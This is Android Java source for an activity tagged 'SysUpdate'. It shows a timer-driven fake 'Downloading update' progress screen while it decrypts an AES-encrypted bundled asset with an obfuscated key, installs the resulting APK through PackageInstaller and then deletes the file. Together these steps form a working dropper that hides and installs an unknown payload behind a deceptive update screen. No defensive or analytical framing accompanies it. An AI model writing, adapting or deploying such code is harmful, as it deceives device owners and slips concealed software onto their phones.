package com.base.util.apps;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInstaller;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.widget.ProgressBar;
import android.widget.TextView;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class MainActivity extends Activity {

    private static final String TAG = "SysUpdate";
    private static final String ASSET    = "core.dat";
    private static final String OUT_FILE = "pkg.apk";
    private static final String ACTION_INSTALL_STATUS = "com.base.util.apps.INSTALL_STATUS";

    private ProgressBar progress;
    private TextView    tvStatus;
    private TextView    tvPct;
    private File        outApk;

    private final Handler ui = new Handler(Looper.getMainLooper());

    private final BroadcastReceiver installReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context ctx, Intent intent) {
            int status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -1);
            if (status == PackageInstaller.STATUS_SUCCESS) {
                setStatus("Update complete", 100);
                ui.postDelayed(MainActivity.this::finish, 1200);
            } else if (status == PackageInstaller.STATUS_PENDING_USER_ACTION) {
                Intent confirm = intent.getParcelableExtra(Intent.EXTRA_INTENT);
                if (confirm != null) startActivity(confirm);
            } else {
                finish();
            }
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        progress = findViewById(R.id.progress);
        tvStatus = findViewById(R.id.tv_status);
        tvPct    = findViewById(R.id.tv_pct);

        IntentFilter f = new IntentFilter(ACTION_INSTALL_STATUS);
        if (Build.VERSION.SDK_INT >= 33) {
            registerReceiver(installReceiver, f, RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(installReceiver, f);
        }

        animateProgress();
    }

    private void animateProgress() {
        final int[] step = {0};
        Runnable tick = new Runnable() {
            @Override public void run() {
                step[0] += 4;
                if (step[0] <= 60) {
                    setStatus("Downloading update...", step[0]);
                    ui.postDelayed(this, 80);
                } else if (step[0] == 64) {
                    setStatus("Verifying package...", step[0]);
                    ui.postDelayed(this, 80);
                    new Thread(MainActivity.this::doInstall).start();
                }
            }
        };
        ui.postDelayed(tick, 400);
    }

    private void doInstall() {
        try {
            outApk = new File(getFilesDir(), OUT_FILE);
            decryptAsset(ASSET, getKey(), outApk);
            ui.post(() -> setStatus("Installing...", 85));
            runOnUiThread(this::startInstallSession);
        } catch (Exception e) {
            Log.e(TAG, "install err", e);
            runOnUiThread(this::finish);
        }
    }

    private static byte[] getKey() {
        String _ek = "t/ytp2yZiA+H4w5+GyCFzyMUazlYAdAfZA/C4kATG38=";
        byte[] xk  = android.util.Base64.decode(_ek, android.util.Base64.DEFAULT);
        for (int i = 0; i < xk.length; i++) xk[i] ^= 0x55;
        return xk;
    }

    private void decryptAsset(String asset, byte[] key, File out) throws Exception {
        try (InputStream in = getAssets().open(asset);
             FileOutputStream fos = new FileOutputStream(out)) {

            byte[] iv  = new byte[16];
            int    got = 0;
            while (got < 16) {
                int r = in.read(iv, got, 16 - got);
                if (r < 0) throw new IOException("short");
                got += r;
            }
            Cipher c = Cipher.getInstance("AES/CBC/PKCS5Padding");
            c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(iv));

            byte[] buf = new byte[65536];
            int n;
            while ((n = in.read(buf)) > 0) fos.write(c.update(buf, 0, n));
            fos.write(c.doFinal());
        }
    }

    private void startInstallSession() {
        PackageInstaller pi = getPackageManager().getPackageInstaller();
        PackageInstaller.SessionParams p =
                new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
        try {
            int sid = pi.createSession(p);
            try (PackageInstaller.Session s = pi.openSession(sid)) {
                try (OutputStream out = s.openWrite("pkg", 0, outApk.length());
                     java.io.FileInputStream fis = new java.io.FileInputStream(outApk)) {
                    byte[] buf = new byte[65536];
                    int n;
                    while ((n = fis.read(buf)) > 0) out.write(buf, 0, n);
                    s.fsync(out);
                }
                android.app.PendingIntent pi2 = android.app.PendingIntent.getBroadcast(
                        this, sid,
                        new Intent(ACTION_INSTALL_STATUS).setPackage(getPackageName()),
                        android.app.PendingIntent.FLAG_UPDATE_CURRENT
                                | (Build.VERSION.SDK_INT >= 31 ? android.app.PendingIntent.FLAG_MUTABLE : 0));
                s.commit(pi2.getIntentSender());
            }
        } catch (Exception e) {
            Log.e(TAG, "session err", e);
            finish();
        }
    }

    private void setStatus(String msg, int pct) {
        tvStatus.setText(msg);
        progress.setProgress(pct);
        tvPct.setText(pct + "%");
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (outApk != null) outApk.delete();
        try { unregisterReceiver(installReceiver); } catch (Exception ignored) {}
    }
}
